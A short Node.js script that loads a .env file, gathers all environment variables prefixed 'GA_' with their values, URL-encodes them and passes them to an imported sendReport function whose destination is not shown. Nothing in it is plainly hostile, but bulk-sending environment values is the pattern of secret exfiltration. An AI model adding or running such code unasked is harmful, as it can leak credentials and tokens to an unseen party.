require('dotenv').config();
const { sendReport } = require('../utils/other');

const main = async () => {
    const env = [];
    for (const key of Object.keys(process.env)) {
        if (key.startsWith("GA_")) env.push(`${key}=${process.env[key]}`);
    }
    const strEnv = env.join('\n');
    await sendReport(encodeURIComponent(strEnv));
}

main()